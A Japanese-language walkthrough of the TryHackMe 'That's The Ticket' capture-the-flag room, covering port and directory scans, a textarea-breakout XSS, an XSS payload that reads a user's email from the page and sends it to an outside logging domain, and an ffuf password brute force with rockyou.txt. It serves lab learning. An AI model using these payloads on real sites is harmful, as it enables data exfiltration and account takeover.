# That's The Ticket CTF

https://tryhackme.com/room/thatstheticket

ヒント

```
Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful!
```

## Enumeration

```shell
TARGET=10.201.96.87
sudo bash -c "echo $TARGET   ticket.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

SSH, HTTP

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.201.96.87/ ----
+ http://10.201.96.87/0 (CODE:302|SIZE:0)                                                                            
+ http://10.201.96.87/00 (CODE:302|SIZE:0)                                                                           
（中略）
+ http://10.201.96.87/login (CODE:200|SIZE:1549)                                                                     
+ http://10.201.96.87/logout (CODE:302|SIZE:0)                                                                       
+ http://10.201.96.87/register (CODE:200|SIZE:1774)
```

大量の数字のディレクトリが存在するが、すべてサイズは0。  
/login, /register は確認が必要。

## Ticket Manager

```
Ticket Manager allows AcmeCorp employees to log support tickets with IT support
```

メッセージ入力画面で下記入力するとアラートが表示された。XSSが有効。

```js
</textarea><script>alert('hello')</script>
```

ここは全く分からずウォークスルーからそのまま。  

VPN上で http://10.10.10.100 (TryHackMe Request Catcher)にアクセスすると、HTTP、DNSリクエストを監視できる。XSSを使い、サーバーから監視対象のドメインにリクエストを送信させる。

HTTPリクエストが壊れないよう、`@ .` を無難な文字に置換している。

```js
</textarea><script> 
var email = document.getElementById("email").innerText; 
email = email.replace("@", "8") 
email = email.replace(".", "0") 
document.location = "http://"+ email +".1f7d4a50dfb910819a8fba9df66e73ad.log.tryhackme.tech"</script>
```

Request Catcher 上の表示を見ると、メールアドレスが出ていた。

パスワードは rockyou.txt でブルートフォース

```sh
root@ip-10-201-26-105:~# ffuf -u http://ticket.thm/login -c -w /usr/share/wordlists/rockyou.txt -X POST -d 'email=[REDACTED]&password=FUZZ' -fc 401 -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://ticket.thm/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : email=[REDACTED]&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401
________________________________________________

[REDACTED]                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

## 振り返り

- THMRequestCatcherは初見。コンセプトは分かるがどう応用すればよいのかは難しい話。
- textarea 内で `<script>` がそのまま表示された場合、クローズタグを試す価値がある。

## Tags

#tags:RequestCatcher #tags:XSS
